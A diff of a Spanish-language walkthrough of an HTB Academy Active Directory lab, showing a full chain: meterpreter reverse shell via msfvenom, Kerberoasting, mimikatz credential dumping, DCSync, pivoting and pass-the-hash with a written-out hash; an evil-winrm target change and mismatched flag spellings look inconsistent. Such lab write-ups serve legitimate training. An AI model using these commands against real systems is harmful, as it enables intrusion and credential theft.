@@ -4,7 +4,6 @@ Un miembro del equipo comenzó una Prueba de Penetración Externa y fue traslada
 
 Aplica lo aprendido en este módulo para comprometer el dominio y responde las preguntas a continuación para completar la parte I de la evaluación de habilidades.
 
-**Preguntas:**
 ##### 1. _Sube los contenidos del archivo flag.txt en el Escritorio del administrador del servidor web_
 
 Nos tomaremos este laboratorio como si de una máquina se tratara. Por ello, comenzamos con la enumeración de puertos:
@@ -32,13 +31,14 @@ type C:\Users\Administrator\Desktop\flag.txt
 ```
 
 > **Respuesta**: JusT_g3tt1ng_st@rt3d!
+
 ##### 2. _Realiza Kerberoast a una cuenta con el SPN MSSQLSvc/SQL01.inlanefreight.local:1433 y envía el nombre de la cuenta como respuesta_
 
 Esta shell supone un absoluto tostón. Cambiemos a una reverse shell. Lo primero es identificar el tipo de sistema de la máquina víctima. Con el comando `systeminfo` lo podemos saber:
 
 ![[Pasted image 20251213013414.png]]
 
-Vale, sabemos que es x64. Por tanto, en este punto, para mayor comodidad y gracias a que Antax nos permite subir archivos, generaremos con `msfvenom` una revershe shell con este tipo de payload:
+Vale, sabemos que es x64. Por tanto, en este punto, para mayor comodidad, generaremos con `msfvenom` una revershe shell con este tipo de payload:
 
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.165 LPORT=443 -f exe -o revmeter.exe
@@ -90,6 +90,7 @@ setspn -T INLANEFREIGHT.LOCAL -Q */*
 ![[Pasted image 20251213015416.png]]
 
 > **Respuesta**: svc_sql
+
 ##### 3. _Crackea la contraseña de la cuenta. Envía el valor en texto claro._
 
 Vamos a hacer esto de dos formas para aprender. 
@@ -256,6 +257,7 @@ mimikatz # sekurlsa::logonpasswords
 El usuario `tpetty` muestra que en wdigest no hay contraseña. 
 
 > **Respuesta**: tpetty
+
 ##### 6. _Envía la contraseña en texto claro de este usuario._
 
 En este punto vamos a avanzar a través de **WDigest**, puesto que hemos visto que para el usuario previo la contraseña era null. **WDigest** es un proveedor de autenticación de Windows que almacena credenciales en memoria para autenticación HTTP. Históricamente almacenaba contraseñas en **texto claro reversible** en el proceso LSASS.
@@ -290,6 +292,7 @@ Y volvemos a iniciar sesión. Repetimos el mismo proceso que antes con mimikatz.
 ![[Pasted image 20251219105520.png]]
 
 > **Respuesta**: Sup3rS3cur3D0m@inU2eR
+
 ##### 7. _¿Qué ataque puede realizar este usuario?_
 
 Para resolver esto, vamos a enumerar los ACLs de este usuario, y así podremos ver sus permisos y capacidades. Antes de poder importar PowerView, tenemos que hacer un bypass temporal en la sesión actual.
@@ -346,6 +349,7 @@ Los **Domain Controllers** usan estos permisos para **replicarse entre ellos** y
 Es como tener una credencial que dice "Soy un banco central, dame copias de todos los registros financieros". El sistema confía y entrega toda la información sensible sin cuestionarlo.
 
 > **tpetty + ExtendedRight (replicación) sobre el dominio = DCSync = Extraer todos los hashes = Compromiso total del dominio**
+
 ##### 8. _Toma el control del dominio y envía el contenido del archivo flag.txt en el escritorio del Administrator en DC01_
 
 Lo primero es ejecutar powershell desde el usuario `tpetty`
@@ -369,7 +373,7 @@ Ya tenemos el hash NTLM del administrador, con el que podremos acontecer un Pass
 
 En este punto, volviendo a nuestra sesión con meterpreter, ponemos en segundo plano la sesión con `Ctrl+Z`
 
-![[Pasted image 20251219114527.png]]
+![[Pasted image 20251219114527.png | 600]]
 
 De esta forma, agregamos una ruta para que todo el tráfico hacia **172.16.6.0/24** pase a través de la sesión Meterpreter, usando WEB-WIN01 (el target original de HTB) como pivote. El flujo es el siguiente:
 
@@ -407,15 +411,72 @@ Hacemos la regla:
 ```
 meterpreter > portfwd add -l 6666 -p 5985 -r 172.16.6.3
 [*] Forward TCP relay created: (local) :6666 -> (remote) 172.16.6.3:5985
+meterpreter > portfwd list
+
+Active Port Forwards
+====================
+
+   Index  Local         Remote           Direction
+   -----  -----         ------           ---------
+   1      0.0.0.0:6666  172.16.6.3:5985  Forward
+
+1 total active port forwards.
 ```
 
 Y lanzamos evil-winrm
 
 ```bash
-evil-winrm -i 127.0.0.1 --port 6666 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0 
+evil-winrm -i 10.10.14.74 --port 6666 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0 
 ```
 
 Obtendremos la flag en el escritorio del administrador.
 
+![[Pasted image 20251219120905.png]]
+
 > **Respuesta**: r3plicat1on_m@st3r!
 
+## Resumen del ataque completo
+
+### 1. **Punto de entrada inicial**
+
+- Web shell en `/uploads` → Reverse shell con Meterpreter
+
+### 2. **Kerberoasting**
+
+- Enumeración de SPNs: `setspn -T INLANEFREIGHT.LOCAL -Q */*`
+- Usuario encontrado: **svc_sql** con SPN
+- Extracción de hash TGS con **Rubeus** y **PowerView**
+- Crackeo con hashcat: `svc_sql:lucky7`
+
+### 3. **Movimiento lateral a MS01**
+
+- Acceso con credenciales de svc_sql
+- Port forwarding con `netsh` para RDP
+- Ejecución de Mimikatz para dump de memoria
+
+### 4. **Enumeración de permisos ACL**
+
+- Usuario encontrado: **tpetty**
+- Permisos: **ExtendedRight** (DS-Replication-Get-Changes)
+- Ataque identificado: **DCSync**
+
+### 5. **DCSync Attack**
+
+- Extracción de hash NTLM del Administrator: `27dedb1dab4d8545c6e1c66fba077da0`
+- Mimikatz: `lsadump::dcsync /user:administrator`
+
+### 6. **Compromiso del dominio**
+
+- Pivoting con **autoroute** de Meterpreter a subred 172.16.6.0/24
+- Port forwarding WinRM: puerto 6666 → 172.16.6.3:5985
+- **Pass-the-Hash** con evil-winrm → Acceso como Domain Admin
+- Flag final: `r3pl1cation_m@st3r!`
+
+## Técnicas usadas
+
+✅ Kerberoasting (Rubeus, PowerView, Invoke-Kerberoast) 
+✅ Mimikatz (sekurlsa::logonpasswords, lsadump::dcsync) 
+✅ Enumeración de ACLs (Get-DomainObjectACL) 
+✅ DCSync Attack 
+✅ Pivoting con Meterpreter (autoroute, portfwd) 
+✅ Pass-the-Hash (evil-winrm, impacket)
